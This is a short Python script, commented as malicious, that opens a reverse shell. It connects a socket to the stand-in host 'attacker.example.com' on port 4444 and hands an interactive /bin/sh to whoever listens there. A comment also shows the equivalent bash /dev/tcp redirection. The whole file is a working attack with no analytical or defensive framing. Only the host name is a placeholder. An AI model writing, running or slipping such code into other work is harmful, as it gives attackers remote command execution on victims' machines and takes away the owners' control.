import socket
import subprocess

# Malicious script: opens a reverse shell to an attacker-controlled host
# via bash's /dev/tcp/ redirection mechanism
HOST = "attacker.example.com"
PORT = 4444

# exec 5<>/dev/tcp/attacker.example.com/4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
subprocess.call(["/bin/sh", "-i"], stdin=s, stdout=s, stderr=s)
